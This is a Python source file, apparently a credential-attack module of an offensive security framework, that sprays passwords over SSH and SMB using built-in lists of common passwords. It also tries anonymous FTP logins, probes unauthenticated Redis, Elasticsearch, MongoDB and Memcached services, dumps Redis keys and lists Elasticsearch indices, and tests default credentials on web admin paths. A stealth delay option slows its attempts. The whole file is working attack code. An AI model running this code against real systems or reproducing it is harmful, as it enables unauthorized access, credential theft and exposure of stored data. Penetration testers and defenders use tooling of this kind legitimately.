"""Password spraying, default credential testing, hash capture."""

from __future__ import annotations

import re
from typing import List, Optional

from aegis.models import AttackResult, Credential, EngagementContext, OpenPort
from aegis.logger import log
from aegis.modules.base import BaseModule
from aegis.utils.network import tcp_connect, sleep_if_stealth
from aegis.data.ports import SSH_USERNAMES, SSH_PASSWORDS, IOT_DEFAULT_CREDS, WEB_ADMIN_PATHS

try:
    from impacket.smbconnection import SMBConnection
    IMPACKET = True
except ImportError:
    IMPACKET = False

try:
    import paramiko
    PARAMIKO = True
except ImportError:
    PARAMIKO = False

try:
    import requests as _req_lib
    REQUESTS = True
except ImportError:
    REQUESTS = False


class CredAttackModule(BaseModule):
    """Password spraying, default credential testing, hash capture."""

    name = "cred"

    def run(self, ctx: EngagementContext, **kwargs: object) -> List[AttackResult]:
        username_list: Optional[List[str]] = kwargs.get("username_list")  # type: ignore[assignment]
        password_list: Optional[List[str]] = kwargs.get("password_list")  # type: ignore[assignment]
        spray_password: str = str(kwargs.get("spray_password", ""))

        results: List[AttackResult] = []
        for op in ctx.open_ports:
            if op.port == 22:
                results.extend(self._ssh_spray(ctx, op, username_list or SSH_USERNAMES,
                                               password_list or SSH_PASSWORDS[:5], spray_password))
            elif op.port in (139, 445):
                results.extend(self._smb_spray(ctx, op, username_list, password_list, spray_password))
            elif op.port == 21:
                results.extend(self._ftp_anon(ctx, op))
            elif op.port == 6379:
                results.extend(self._redis_unauth(ctx, op))
            elif op.port in (9200, 9300):
                results.extend(self._elasticsearch_unauth(ctx, op))
            elif op.port == 27017:
                results.extend(self._mongodb_unauth(ctx, op))
            elif op.port == 11211:
                results.extend(self._memcached_unauth(ctx, op))
            elif op.port in (80, 8080, 8443, 443):
                results.extend(self._http_default_creds(ctx, op))
        return results

    # ------------------------------------------------------------------
    # SSH
    # ------------------------------------------------------------------

    def _ssh_spray(self, ctx: EngagementContext, op: OpenPort,
                   usernames: List[str], passwords: List[str],
                   spray_pass: str) -> List[AttackResult]:
        if not PARAMIKO:
            return [AttackResult("cred", "ssh_spray", "PARTIAL", host=op.host, port=op.port,
                                 notes="Install paramiko for SSH attacks")]
        results: List[AttackResult] = []
        spray_list = [(u, spray_pass) for u in usernames] if spray_pass else \
                     [(u, p) for u in usernames for p in passwords]

        for username, password in spray_list[:30]:  # cap iterations
            try:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(op.host, port=op.port, username=username, password=password,
                               timeout=ctx.timeout, banner_timeout=ctx.timeout, allow_agent=False)
                log(f"[Cred/SSH] SUCCESS {op.host}:{op.port} {username}:{password}", "CRIT")
                cred = Credential("SSH", op.host, op.port, username, password,
                                  notes="SSH brute-force success")
                ctx.credentials.append(cred)
                results.append(AttackResult(
                    "cred", "ssh_login", "SUCCESS",
                    host=op.host, port=op.port, severity="CRITICAL",
                    data={"username": username, "password": password},
                    notes=f"Valid SSH credentials: {username}:{password}",
                ))
                client.close()
            except paramiko.AuthenticationException:
                pass
            except Exception as exc:
                if "too many" in str(exc).lower():
                    log(f"[Cred/SSH] Rate limited on {op.host}", "WARN")
                    break
            sleep_if_stealth(ctx)
        return results

    # ------------------------------------------------------------------
    # SMB
    # ------------------------------------------------------------------

    def _smb_spray(self, ctx: EngagementContext, op: OpenPort,
                   usernames: Optional[List[str]], passwords: Optional[List[str]],
                   spray_pass: str) -> List[AttackResult]:
        if not IMPACKET:
            return []
        results: List[AttackResult] = []
        unames = usernames or ["administrator", "admin", "guest", "test", "backup", "service"]
        pwds = [spray_pass] if spray_pass else (passwords or ["Password1", "Welcome1", "Spring2024!"])
        for u in unames:
            for p in pwds:
                try:
                    conn = SMBConnection(op.host, op.host, sess_port=op.port, timeout=int(ctx.timeout))
                    conn.login(u, p, "")
                    log(f"[Cred/SMB] SUCCESS {op.host} {u}:{p}", "CRIT")
                    cred = Credential("SMB", op.host, op.port, u, p)
                    ctx.credentials.append(cred)
                    results.append(AttackResult(
                        "cred", "smb_login", "SUCCESS",
                        host=op.host, port=op.port, severity="CRITICAL",
                        data={"username": u, "password": p},
                        notes=f"SMB login success: {u}:{p}",
                    ))
                    conn.close()
                except Exception:
                    pass
                sleep_if_stealth(ctx)
        return results

    # ------------------------------------------------------------------
    # FTP
    # ------------------------------------------------------------------

    def _ftp_anon(self, ctx: EngagementContext, op: OpenPort) -> List[AttackResult]:
        results: List[AttackResult] = []
        try:
            s = tcp_connect(op.host, op.port, ctx.timeout)
            if not s:
                return results
            banner = s.recv(256).decode("utf-8", errors="replace")
            s.sendall(b"USER anonymous\r\n")
            r1 = s.recv(256).decode("utf-8", errors="replace")
            s.sendall(b"PASS anonymous@\r\n")
            r2 = s.recv(256).decode("utf-8", errors="replace")
            if "230" in r2 or "logged in" in r2.lower():
                log(f"[Cred/FTP] Anonymous login on {op.host}:{op.port}!", "CRIT")
                s.sendall(b"PWD\r\n")
                pwd_r = s.recv(256).decode("utf-8", errors="replace")
                s.sendall(b"PASV\r\n")
                s.sendall(b"LIST\r\n")
                ctx.credentials.append(Credential("FTP", op.host, op.port, "anonymous", ""))
                results.append(AttackResult(
                    "cred", "ftp_anonymous", "SUCCESS",
                    host=op.host, port=op.port, severity="HIGH",
                    data={"banner": banner, "pwd": pwd_r},
                    notes=f"FTP anonymous login allowed on {op.host}:{op.port}",
                ))
            s.sendall(b"QUIT\r\n")
            s.close()
        except Exception as exc:
            results.append(AttackResult("cred", "ftp_anon", "FAILED",
                                        host=op.host, port=op.port, notes=str(exc)))
        return results

    # ------------------------------------------------------------------
    # Redis
    # ------------------------------------------------------------------

    def _redis_unauth(self, ctx: EngagementContext, op: OpenPort) -> List[AttackResult]:
        results: List[AttackResult] = []
        s = tcp_connect(op.host, op.port, ctx.timeout)
        if not s:
            return results
        try:
            s.sendall(b"*1\r\n$4\r\nINFO\r\n")
            data = s.recv(4096).decode("utf-8", errors="replace")
            if "redis_version" in data:
                m = re.search(r"redis_version:([\d.]+)", data)
                ver = m.group(1) if m else "unknown"
                log(f"[Cred/Redis] Unauthenticated Redis on {op.host}:{op.port} v{ver}!", "CRIT")
                # Try to dump keys
                s.sendall(b"*1\r\n$4\r\nKEYS\r\n$1\r\n*\r\n")
                keys_data = s.recv(4096).decode("utf-8", errors="replace")
                ctx.credentials.append(Credential("Redis", op.host, op.port, "", "",
                                                   notes=f"Unauthenticated Redis v{ver}"))
                results.append(AttackResult(
                    "cred", "redis_unauth", "SUCCESS",
                    host=op.host, port=op.port, severity="CRITICAL",
                    data={"version": ver, "keys_response": keys_data[:200]},
                    notes=f"Redis {ver} exposed without auth. Run: redis-cli -h {op.host} keys '*'",
                ))
        except Exception:
            pass
        finally:
            s.close()
        return results

    # ------------------------------------------------------------------
    # Elasticsearch
    # ------------------------------------------------------------------

    def _elasticsearch_unauth(self, ctx: EngagementContext, op: OpenPort) -> List[AttackResult]:
        if not REQUESTS:
            return []
        results: List[AttackResult] = []
        try:
            resp = _req_lib.get(f"http://{op.host}:{op.port}/",
                                timeout=ctx.timeout, verify=False)
            data = resp.json()
            if "version" in data:
                ver = data["version"].get("number", "?")
                log(f"[Cred/ES] Unauthenticated Elasticsearch {ver} on {op.host}:{op.port}!", "CRIT")
                # Enumerate indices
                idx_resp = _req_lib.get(f"http://{op.host}:{op.port}/_cat/indices?v",
                                        timeout=ctx.timeout, verify=False)
                ctx.credentials.append(Credential("Elasticsearch", op.host, op.port, "", "",
                                                   notes=f"Unauthenticated ES v{ver}"))
                results.append(AttackResult(
                    "cred", "elasticsearch_unauth", "SUCCESS",
                    host=op.host, port=op.port, severity="CRITICAL",
                    data={"version": ver, "indices": idx_resp.text[:400]},
                    notes=f"Elasticsearch {ver} exposed — all data accessible",
                ))
        except Exception:
            pass
        return results

    # ------------------------------------------------------------------
    # MongoDB
    # ------------------------------------------------------------------

    def _mongodb_unauth(self, ctx: EngagementContext, op: OpenPort) -> List[AttackResult]:
        results: List[AttackResult] = []
        # MongoDB wire protocol: isMaster command
        msg = (
            b"\x48\x00\x00\x00"  # length
            b"\x01\x00\x00\x00"  # requestId
            b"\x00\x00\x00\x00"  # responseTo
            b"\xd4\x07\x00\x00"  # opCode OP_QUERY
            b"\x00\x00\x00\x00"  # flags
            b"admin.$cmd\x00"     # collection
            b"\x00\x00\x00\x00"  # skip
            b"\x01\x00\x00\x00"  # return 1
            b"\x13\x00\x00\x00\x10isMaster\x00\x01\x00\x00\x00\x00"  # doc
        )
        s = tcp_connect(op.host, op.port, ctx.timeout)
        if not s:
            return results
        try:
            s.sendall(msg)
            resp = s.recv(4096)
            if b"ismaster" in resp.lower() or b"ok" in resp:
                log(f"[Cred/Mongo] Unauthenticated MongoDB on {op.host}:{op.port}!", "CRIT")
                ctx.credentials.append(Credential("MongoDB", op.host, op.port, "", "",
                                                   notes="Unauthenticated MongoDB"))
                results.append(AttackResult(
                    "cred", "mongodb_unauth", "SUCCESS",
                    host=op.host, port=op.port, severity="CRITICAL",
                    notes=f"MongoDB on {op.host}:{op.port} accessible without credentials",
                ))
        except Exception:
            pass
        finally:
            s.close()
        return results

    # ------------------------------------------------------------------
    # Memcached
    # ------------------------------------------------------------------

    def _memcached_unauth(self, ctx: EngagementContext, op: OpenPort) -> List[AttackResult]:
        results: List[AttackResult] = []
        s = tcp_connect(op.host, op.port, ctx.timeout)
        if not s:
            return results
        try:
            s.sendall(b"stats\r\n")
            data = s.recv(4096).decode("utf-8", errors="replace")
            if "STAT pid" in data or "STAT version" in data:
                m = re.search(r"STAT version ([\d.]+)", data)
                ver = m.group(1) if m else "?"
                log(f"[Cred/Memcached] Unauthenticated Memcached v{ver} on {op.host}:{op.port}!", "CRIT")
                results.append(AttackResult(
                    "cred", "memcached_unauth", "SUCCESS",
                    host=op.host, port=op.port, severity="CRITICAL",
                    data={"version": ver, "stats": data[:300]},
                    notes=f"Memcached {ver} unauthenticated — cache dump possible",
                ))
        except Exception:
            pass
        finally:
            s.close()
        return results

    # ------------------------------------------------------------------
    # HTTP default credentials
    # ------------------------------------------------------------------

    def _http_default_creds(self, ctx: EngagementContext, op: OpenPort) -> List[AttackResult]:
        if not REQUESTS:
            return []
        results: List[AttackResult] = []
        proto = "https" if op.port in (443, 8443) else "http"
        base = f"{proto}://{op.host}:{op.port}"

        for path in WEB_ADMIN_PATHS[:6]:
            url = base + path
            try:
                resp = _req_lib.get(url, timeout=ctx.timeout, verify=False,
                                    allow_redirects=False)
                if resp.status_code in (200, 401):
                    for user, passwd in IOT_DEFAULT_CREDS["HTTP"][:6]:
                        r = _req_lib.get(url, auth=(user, passwd),
                                         timeout=ctx.timeout, verify=False)
                        if r.status_code == 200 and r.status_code != resp.status_code:
                            log(f"[Cred/HTTP] Default creds work! {url} {user}:{passwd}", "CRIT")
                            ctx.credentials.append(
                                Credential("HTTP", op.host, op.port, user, passwd,
                                           notes=f"Default creds on {url}"))
                            results.append(AttackResult(
                                "cred", "http_default_creds", "SUCCESS",
                                host=op.host, port=op.port, severity="CRITICAL",
                                data={"url": url, "user": user, "pass": passwd},
                                notes=f"HTTP default creds {user}:{passwd} on {url}",
                            ))
                            break
            except Exception:
                pass
        return results
